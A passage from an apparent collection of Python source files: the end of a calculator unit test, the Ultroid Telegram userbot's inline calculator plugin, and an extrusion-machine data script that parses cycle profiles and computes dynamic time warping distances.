my_calc = MyCalculator()\n        self.assertEqual(0, my_calc.cubeRoot(0))\n        self.assertEqual(1, my_calc.cubeRoot(1))\n        self.assertEqual(3, my_calc.cubeRoot(27))\n        self.assertEqual(1.5, my_calc.cubeRoot(3.375))\n        \n    def test_exponentiate(self):\n        my_calc = MyCalculator()\n        self.assertEqual(0, my_calc.exponentiate(0,10))\n        self.assertEqual(1, my_calc.exponentiate(1,0))\n        self.assertEqual(1, my_calc.exponentiate(1,2))\n        self.assertEqual(1, my_calc.exponentiate(-1,2))\n        self.assertEqual(-1, my_calc.exponentiate(-1,3))\n        self.assertEqual(625, my_calc.exponentiate(5,4))\n        self.assertEqual(2187, my_calc.exponentiate(3,7))\n        \n    \n    \nunittest.main()\n\n", "315": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "316": "from __future__ import print_function\n\nimport json\nimport os\nimport base64\nimport io\n\n# Loading DataFrame libraries\nimport numpy as np\nimport pandas as pd\nimport time\n\n# Loading DTW library\nfrom dtaidistance import dtw\n\n\n# Cycle Object\nclass Cycle:\n    def __init__(self, cycle):\n        self.cycleNumber = cycle['CycleNumber']\n        self.startTime = int(cycle['CycleStartTime'])\n        self.endTime = int(cycle['CycleEndTime'])\n        self.totalTime = float(cycle['CycleTotalTime'])\n\n        data = cycle['CycleData']\n\n        # Eject Cylinder\n\n        eject_cylinder = data['EjectCylinder']\n\n        if 'SetRWTC1Profile' in eject_cylinder:\n            self.setRWTC1 = self.fix_list(eject_cylinder['SetRWTC1Profile'])\n        else:\n            self.setRWTC1 = 0\n\n        if 'SetRWTC2Profile' in eject_cylinder:\n            self.setRWTC2 = self.fix_list(eject_cylinder['SetRWTC2Profile'])\n        else:\n            self.setRWTC2 = 0\n\n        if 'SetSuctionProfile' in eject_cylinder:\n            self.setSuction = self.fix_list(eject_cylinder['SetSuctionProfile'])\n        else:\n            self.setSuction = 0\n\n        if 'SetWTCProfile' in eject_cylinder:\n            self.setWTC = self.fix_list(eject_cylinder['SetWTCProfile'])\n        else:\n            self.setWTC = 0\n\n        self.ejectTime = float(eject_cylinder['ActEjectTime'])\n\n        if 'ActRWTC1Profile' in eject_cylinder:\n            self.RWTC1 = self.fix_list(eject_cylinder['ActRWTC1Profile'])\n        else:\n            self.RWTC1 = 0\n\n        if 'ActRWTC2Profile' in eject_cylinder:\n            self.RWTC2 = self.fix_list(eject_cylinder['ActRWTC2Profile'])\n        else:\n            self.RWTC2 = 0\n\n        if 'ActSuctionProfile' in eject_cylinder:\n            self.suction = self.fix_list(eject_cylinder['ActSuctionProfile'])\n        else:\n            self.suction = 0.0\n\n        if 'ActWTCProfile' in eject_cylinder:\n            self.WTC = self.fix_list(eject_cylinder['ActWTCProfile'])\n        else:\n            self.WTC = 0.0\n\n        self.dieTempZ1 = []\n        if 'ActDieTemperatureProfileZone1' in eject_cylinder:\n            die_temperature_profile_zone1 = eject_cylinder['ActDieTemperatureProfileZone1']\n\n            for t in die_temperature_profile_zone1.values():\n                self.dieTempZ1.append(float(t))\n        else:\n            self.dieTempZ1.append(0.0)\n\n        self.dieTempZ2 = []\n        if 'ActDieTemperatureProfileZone2' in eject_cylinder:\n            die_temperature_profile_zone2 = eject_cylinder['ActDieTemperatureProfileZone2']\n\n            for t in die_temperature_profile_zone2.values():\n                self.dieTempZ2.append(float(t))\n        else:\n            self.dieTempZ2.append(0.0)\n\n        self.dieTempZ3 = []\n        if 'ActDieTemperatureProfileZone3' in eject_cylinder:\n            die_temperature_profile_zone3 = eject_cylinder['ActDieTemperatureProfileZone3']\n\n            for t in die_temperature_profile_zone3.values():\n                self.dieTempZ3.append(float(t))\n        else:\n            self.dieTempZ3.append(0.0)\n\n        self.headTempZ1 = []\n        if 'ActHeadTemperatureProfileZone1' in eject_cylinder:\n            head_temperature_profile_zone1 = eject_cylinder['ActHeadTemperatureProfileZone1']\n\n            for t in head_temperature_profile_zone1.values():\n                self.headTempZ1.append(float(t))\n        else:\n            self.headTempZ1.append(0.0)\n\n        self.headTempZ2 = []\n        if 'ActHeadTemperatureProfileZone2' in eject_cylinder:\n            head_temperature_profile_zone2 = eject_cylinder['ActHeadTemperatureProfileZone2']\n\n            for t in head_temperature_profile_zone2.values():\n                self.headTempZ2.append(float(t))\n        else:\n            self.headTempZ2.append(0.0)\n\n        self.headTempZ3 = []\n        if 'ActHeadTemperatureProfileZone3' in eject_cylinder:\n            head_temperature_profile_zone3 = eject_cylinder['ActHeadTemperatureProfileZone3']\n\n            for t in head_temperature_profile_zone3.values():\n                self.headTempZ3.append(float(t))\n        else:\n            self.headTempZ3.append(0.0)\n\n        if 'SetDieTemperatureProfileZone1' in eject_cylinder:\n            self.setDieTempZ1 = 210\n        else:\n            self.setDieTempZ1 = 0.0\n\n        if 'SetDieTemperatureProfileZone2' in eject_cylinder:\n            self.setDieTempZ2 = 210\n        else:\n            self.setDieTempZ2 = 0.0\n\n        if 'SetDieTemperatureProfileZone3' in eject_cylinder:\n            self.setDieTempZ3 = 215\n        else:\n            self.setDieTempZ3 = 0.0\n\n        if 'SetHeadTemperatureProfileZone1' in eject_cylinder:\n            self.setHeadTempZ1 = 210\n        else:\n            self.setHeadTempZ1 = 0.0\n\n        if 'SetHeadTemperatureProfileZone2' in eject_cylinder:\n            self.setHeadTempZ2 = 210\n        else:\n            self.setHeadTempZ2 = 0.0\n\n        if 'SetHeadTemperatureProfileZone3' in eject_cylinder:\n            self.setHeadTempZ3 = 210\n        else:\n            self.setHeadTempZ3 = 0.0\n\n        ###############\n        del eject_cylinder\n\n        # Extruder Data\n        extruder = data['Extruder']\n\n        self.meltTemp = []\n        if 'ActMeltTemperatureProfile' in extruder:\n            act_melt_temperature_profile = extruder['ActMeltTemperatureProfile']\n\n            for t in act_melt_temperature_profile.values():\n                self.meltTemp.append(float(t))\n        else:\n            self.meltTemp.append(0.0)\n\n        self.tempFZ = []\n        if 'ActTemperatureProfileFeedZone' in extruder:\n            act_temperature_profile_feed_zone = extruder['ActTemperatureProfileFeedZone']\n\n            for t in act_temperature_profile_feed_zone.values():\n                self.tempFZ.append(float(t))\n        else:\n            self.tempFZ.append(0.0)\n\n        self.tempZA1 = []\n        if 'ActTemperatureProfileZoneA1' in extruder:\n            act_temperature_profile_zone_a1 = extruder['ActTemperatureProfileZoneA1']\n\n            for t in act_temperature_profile_zone_a1.values():\n                self.tempZA1.append(float(t))\n        else:\n            self.tempZA1.append(0.0)\n\n        self.tempZA10 = []\n        if 'ActTemperatureProfileZoneA10' in extruder:\n            act_temperature_profile_zone_a10 = extruder['ActTemperatureProfileZoneA10']\n\n            for t in act_temperature_profile_zone_a10.values():\n                self.tempZA10.append(float(t))\n        else:\n            self.tempZA10.append(0.0)\n\n        self.tempZA11 = []\n        if 'ActTemperatureProfileZoneA11' in extruder:\n            act_temperature_profile_zone_a11 = extruder['ActTemperatureProfileZoneA11']\n\n            for t in act_temperature_profile_zone_a11.values():\n                self.tempZA11.append(float(t))\n        else:\n            self.tempZA11.append(0.0)\n\n        self.tempZA2 = []\n        if 'ActTemperatureProfileZoneA2' in extruder:\n            act_temperature_profile_zone_a2 = extruder['ActTemperatureProfileZoneA2']\n\n            for t in act_temperature_profile_zone_a2.values():\n                self.tempZA2.append(float(t))\n        else:\n            self.tempZA2.append(0.0)\n\n        self.tempZA3 = []\n        if 'ActTemperatureProfileZoneA3' in extruder:\n            act_temperature_profile_zone_a3 = extruder['ActTemperatureProfileZoneA3']\n\n            for t in act_temperature_profile_zone_a3.values():\n                self.tempZA3.append(float(t))\n        else:\n            self.tempZA3.append(0.0)\n\n        self.exPressure = []\n        if 'ActExtruderPressureProfile' in extruder:\n            act_extruder_pressure_profile = extruder['ActExtruderPressureProfile']\n\n            for t in act_extruder_pressure_profile.values():\n                self.exPressure.append(float(t))\n        else:\n            self.exPressure.append(0.0)\n\n        self.exSpeed = []\n        if 'ActExtruderSpeedProfile' in extruder:\n            act_extruder_speed_profile = extruder['ActExtruderSpeedProfile']\n\n            for t in act_extruder_speed_profile.values():\n                self.exSpeed.append(float(t))\n        else:\n            self.exSpeed.append(0.0)\n\n        self.exTorque = []\n        if 'ActExtruderTorqueProfile' in extruder:\n            act_extruder_torque_profile = extruder['ActExtruderTorqueProfile']\n\n            for t in act_extruder_torque_profile.values():\n                self.exTorque.append(float(t))\n        else:\n            self.exTorque.append(0.0)\n\n        if 'SetMeltTemperatureProfile' in extruder:\n            self.setMeltTemp = 210.0\n        else:\n            self.setMeltTemp = 0.0\n\n        if 'SetTemperatureProfileFeedZone' in extruder:\n            self.setTempFZ = 250.0\n        else:\n            self.setTempFZ = 0.0\n\n        if 'SetTemperatureProfileZoneA1' in extruder:\n            self.setTempZA1 = 190.0\n        else:\n            self.setTempZA1 = 0.0\n\n        if 'SetTemperatureProfileZoneA10' in extruder:\n            self.setTempZA10 = 220.0\n        else:\n            self.setTempZA10 = 0.0\n\n        if 'SetTemperatureProfileZoneA11' in extruder:\n            self.setTempZA11 = 220.0\n        else:\n            self.setTempZA11 = 0.0\n\n        if 'SetTemperatureProfileZoneA2' in extruder:\n            self.setTempZA2 = 205.0\n        else:\n            self.setTempZA2 = 0.0\n\n        if 'SetTemperatureProfileZoneA3' in extruder:\n            self.setTempZA3 = 215.0\n        else:\n            self.setTempZA3 = 0.0\n\n        del extruder\n\n        del data\n\n    @staticmethod\n    def fix_list(the_list):\n        ams = the_list.values()\n        trim_list = ''\n        for i in ams:\n            i = i[1:-1]\n            trim_list = i\n        split_list = trim_list.split(', ')\n        split_list = [float(i) for i in split_list]\n        clean_list = list(filter(lambda a: a != -1001.0, split_list))\n        return clean_list\n\n\n# Calculate Distances to Simplify Time Series Data\ndef calc_distance(actual, cycle_settings):\n    x1 = np.array(actual)\n    y1 = x1.astype(np.float)\n    x2 = np.array(cycle_settings)\n    y2 = x2.astype(np.float)\n    distance = dtw.distance_fast(y1, y2)\n    return distance\n\n\n# Calculate Average\ndef calc_average(column):\n    test_sum = []\n    ss = 0\n    for col in column:\n        test_sum.append(len(col))\n        ss += 1\n    ff = int(sum(test_sum) / ss)\n\n    ex_default = []\n    for x in [*range(0, ff)]:\n        val_av = []\n        for col in column:\n            try:\n                val_av.append(col[x])\n            except Exception as e:\n                print(e)\n                pass\n        ex_default.append(sum(val_av) / len(val_av))\n    return ex_default\n\n\n# Calculate Average for previous three\ndef calc_average_three(m, column):\n    if m > 2:\n        ff = int((len(column[m - 1]) + len(column[m - 2]) + len(column[m - 3]))/3)\n        ex_default = []\n        column3 = column[(m - 3):m]\n        for x in [*range(0, ff)]:\n            val_av = []\n            for col in column3:\n                try:\n                    val_av.append(col[x])\n                except Exception as e:\n                    print(e)\n                    pass\n            ex_default.append(sum(val_av) / len(val_av))\n    elif m == 2:\n        ff = int((len(column[m - 1]) + len(column[m - 2])) / 2)\n        ex_default = []\n        column2 = column[(m - 2):m]\n        for x in [*range(0, ff)]:\n            val_av = []\n            for col in column2:\n                try:\n                    val_av.append(col[x])\n                except Exception as e:\n                    print(e)\n                    pass\n            ex_default.append(sum(val_av) / len(val_av))\n    elif m == 1:\n        ex_default = column[m-1]\n    else:\n        ex_default = column[m]\n    return ex_default\n\n\n# Change to Product data\ndef transform_product(df_product):\n    new_df = pd.DataFrame(columns=df_product.columns)\n    for x in [*range(0, len(df_product)-2)]:\n        df_temp = df_product[x:x+3].copy()\n        m = 0\n        temp_dict = {}\n        pass\n        temp_dict['startTime'] = df_temp['startTime'][0]\n        temp_dict['endTime'] = df_temp['endTime'][2]\n        temp_dict['totalTime'] = df_temp['endTime'][2] - df_temp['startTime'][0]\n        temp_dict['ejectTime'] = df_temp['ejectTime'][1]\n\n        for col in df_temp.columns:\n            if m > 3:\n                y = df_temp[col][0].copy()\n                y.extend(df_temp[col][1])\n                y.extend(df_temp[col][2])\n                temp_dict[col] = y\n            else:\n                pass\n            m += 1\n        the_index = ''\n        if x < 10:\n            the_index = 'C0000' + str(x)\n        elif 9 < x < 100:\n            the_index = 'C000' + str(x)\n        elif 99 < x < 1000:\n            the_index = 'C00' + str(x)\n        elif 999 < x < 10000:\n            the_index = 'C0' + str(x)\n        new_df.loc[the_index] = temp_dict\n    return new_df\n\n\ndef transform_product_selective(df_product):\n    new_df = pd.DataFrame(columns=df_product.columns)\n    for x in [*range(0, len(df_product)-2)]:\n        df_temp = df_product[x:x+3].copy()\n        m = 0\n        temp_dict = {}\n        pass\n        temp_dict['startTime'] = df_temp['startTime'][0]\n        temp_dict['endTime'] = df_temp['endTime'][2]\n        temp_dict['totalTime'] = df_temp['endTime'][2] - df_temp['startTime'][0]\n        temp_dict['ejectTime'] = df_temp['ejectTime'][1]\n        the_index = ''\n        for col in df_temp.columns:\n            if m > 13:\n                y = df_temp[col][0].copy()\n                temp_dict[col] = y\n            elif 3 < m < 14:\n                y = df_temp[col][1].copy()\n                temp_dict[col] = y\n            else:\n                pass\n            m += 1\n        if x < 10:\n            the_index = 'C0000' + str(x)\n        elif 9 < x < 100:\n            the_index = 'C000' + str(x)\n        elif 99 < x < 1000:\n            the_index = 'C00' + str(x)\n        elif 999 < x < 10000:\n            the_index = 'C0' + str(x)\n        new_df.loc[the_index] = temp_dict\n    return new_df\n\n\n# Create DataFrame\ndef create_dataframe_previous_three(df_cycle_main):\n    start = time.time()\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['exPressure']:\n        ex_default = calc_average_three(m, df_cycle_main['exPressure'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['exPressure'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['exSpeed']:\n        ex_default = calc_average_three(m, df_cycle_main['exSpeed'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['exSpeed'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['exTorque']:\n        ex_default = calc_average_three(m, df_cycle_main['exTorque'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['exTorque'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['RWTC1']:\n        ex_default = calc_average_three(m, df_cycle_main['RWTC1'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['RWTC1'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['RWTC2']:\n        ex_default = calc_average_three(m, df_cycle_main['RWTC2'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['RWTC2'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['suction']:\n        ex_default = calc_average_three(m, df_cycle_main['suction'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['suction'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['WTC']:\n        ex_default = calc_average_three(m, df_cycle_main['WTC'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['WTC'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['dieTempZ1']:\n        ex_default = calc_average_three(m, df_cycle_main['dieTempZ1'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['dieTempZ1'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['dieTempZ2']:\n        ex_default = calc_average_three(m, df_cycle_main['dieTempZ2'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['dieTempZ2'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['dieTempZ3']:\n        ex_default = calc_average_three(m, df_cycle_main['dieTempZ3'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['dieTempZ3'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['headTempZ1']:\n        ex_default = calc_average_three(m, df_cycle_main['headTempZ1'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['headTempZ1'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['headTempZ2']:\n        ex_default = calc_average_three(m, df_cycle_main['headTempZ2'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['headTempZ2'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['headTempZ3']:\n        ex_default = calc_average_three(m, df_cycle_main['headTempZ3'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['headTempZ3'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['tempFZ']:\n        ex_default = calc_average_three(m, df_cycle_main['tempFZ'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['tempFZ'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['tempZA1']:\n        ex_default = calc_average_three(m, df_cycle_main['tempZA1'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['tempZA1'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['tempZA10']:\n        ex_default = calc_average_three(m, df_cycle_main['tempZA10'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['tempZA10'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['tempZA11']:\n        ex_default = calc_average_three(m, df_cycle_main['tempZA11'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['tempZA11'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['tempZA2']:\n        ex_default = calc_average_three(m, df_cycle_main['tempZA2'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['tempZA2'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['tempZA3']:\n        ex_default = calc_average_three(m, df_cycle_main['tempZA3'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['tempZA3'][m] = i\n        m += 1\n\n    m = 0\n    ex_av3 = []\n    for i in df_cycle_main['meltTemp']:\n        ex_default = calc_average_three(m, df_cycle_main['meltTemp'])\n        ex_av3.append(calc_distance(i, ex_default))\n        m += 1\n\n    m = 0\n    for i in ex_av3:\n        df_cycle_main['meltTemp'][m] = i\n        m += 1\n\n    del ex_default\n    end = time.time()\n    print(\"Calculate Distances\")\n    print(end - start)\n    return df_cycle_main\n\n\n# Create DataFrame average\ndef create_dataframe_av(df_cycle_main):\n    start = time.time()\n    ex_default = calc_average(df_cycle_main['exPressure'])\n    m = 0\n    for i in df_cycle_main['exPressure']:\n        df_cycle_main['exPressure'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    ex_default = calc_average(df_cycle_main['exSpeed'])\n    m = 0\n    for i in df_cycle_main['exSpeed']:\n        df_cycle_main['exSpeed'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    ex_default = calc_average(df_cycle_main['exTorque'])\n    m = 0\n    for i in df_cycle_main['exTorque']:\n        df_cycle_main['exTorque'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    ex_default = calc_average(df_cycle_main['RWTC1'])\n    m = 0\n    for i in df_cycle_main['RWTC1']:\n        df_cycle_main['RWTC1'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    ex_default = calc_average(df_cycle_main['RWTC2'])\n    m = 0\n    for i in df_cycle_main['RWTC2']:\n        df_cycle_main['RWTC2'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    ex_default = calc_average(df_cycle_main['suction'])\n    m = 0\n    for i in df_cycle_main['suction']:\n        df_cycle_main['suction'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    ex_default = calc_average(df_cycle_main['WTC'])\n    m = 0\n    for i in df_cycle_main['WTC']:\n        df_cycle_main['WTC'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    ex_default = calc_average(df_cycle_main['dieTempZ1'])\n    m = 0\n    for i in df_cycle_main['dieTempZ1']:\n        df_cycle_main['dieTempZ1'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['dieTempZ2'])\n    for i in df_cycle_main['dieTempZ2']:\n        df_cycle_main['dieTempZ2'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['dieTempZ3'])\n    for i in df_cycle_main['dieTempZ3']:\n        df_cycle_main['dieTempZ3'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['headTempZ1'])\n    for i in df_cycle_main['headTempZ1']:\n        df_cycle_main['headTempZ1'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['headTempZ2'])\n    for i in df_cycle_main['headTempZ2']:\n        df_cycle_main['headTempZ2'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['headTempZ3'])\n    for i in df_cycle_main['headTempZ3']:\n        df_cycle_main['headTempZ3'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['tempFZ'])\n    for i in df_cycle_main['tempFZ']:\n        df_cycle_main['tempFZ'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['tempZA1'])\n    for i in df_cycle_main['tempZA1']:\n        df_cycle_main['tempZA1'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['tempZA10'])\n    for i in df_cycle_main['tempZA10']:\n        df_cycle_main['tempZA10'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['tempZA11'])\n    for i in df_cycle_main['tempZA11']:\n        df_cycle_main['tempZA11'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['tempZA2'])\n    for i in df_cycle_main['tempZA2']:\n        df_cycle_main['tempZA2'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['tempZA3'])\n    for i in df_cycle_main['tempZA3']:\n        df_cycle_main['tempZA3'][m] = calc_distance(i, ex_default)\n        m += 1\n\n    m = 0\n    ex_default = calc_average(df_cycle_main['meltTemp'])\n    for i in df_cycle_main['meltTemp']:\n        df_cycle_main['meltTemp'][m] = calc_distance(i, ex_default)\n        m += 1\n    del ex_default\n    end = time.time()\n    print(\"Calculate Distances\")\n    print(end - start)\n    return df_cycle_main\n\n\n# Create DataFrame previous datapoint\ndef create_dataframe(df_cycle_main):\n    start = time.time()\n\n    m = 0\n    extr = []\n    for i in df_cycle_main['exPressure']:\n        if len(i) > 0:\n            if m != 0:\n                settings_ = extr\n                extr = i\n                df_cycle_main['exPressure'][m] = calc_distance(i, settings_)\n            else:\n                settings_ = i\n                extr = i\n                df_cycle_main['exPressure'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    extr = []\n    for i in df_cycle_main['exSpeed']:\n        if len(i) > 0:\n            if m != 0:\n                settings_ = extr\n                extr = i\n                df_cycle_main['exSpeed'][m] = calc_distance(i, settings_)\n            else:\n                settings_ = i\n                extr = i\n                df_cycle_main['exSpeed'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    extr = []\n    for i in df_cycle_main['exTorque']:\n        if len(i) > 0:\n            if m != 0:\n                settings_ = extr\n                extr = i\n                df_cycle_main['exTorque'][m] = calc_distance(i, settings_)\n            else:\n                settings_ = i\n                extr = i\n                df_cycle_main['exTorque'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    wtc_wtc = []\n    for i in df_cycle_main['RWTC1']:\n        if m != 0:\n            settings_ = wtc_wtc\n            wtc_wtc = i\n            df_cycle_main['RWTC1'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            wtc_wtc = i\n            df_cycle_main['RWTC1'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    wtc_wtc = []\n    for i in df_cycle_main['RWTC2']:\n        if m != 0:\n            settings_ = wtc_wtc\n            wtc_wtc = i\n            df_cycle_main['RWTC2'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            wtc_wtc = i\n            df_cycle_main['RWTC2'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    wtc_wtc = []\n    for i in df_cycle_main['suction']:\n        if m != 0:\n            settings_ = wtc_wtc\n            wtc_wtc = i\n            df_cycle_main['suction'][m] = calc_distance(i, settings_)\n        else:\n            settings_ = i\n            wtc_wtc = i\n            df_cycle_main['suction'][m] = calc_distance(i, settings_)\n        m += 1\n\n    m = 0\n    wtc_wtc = []\n    for i in df_cycle_main['WTC']:\n        if m != 0:\n            settings_ = wtc_wtc\n            wtc_wtc = i\n            df_cycle_main['WTC'][m] = 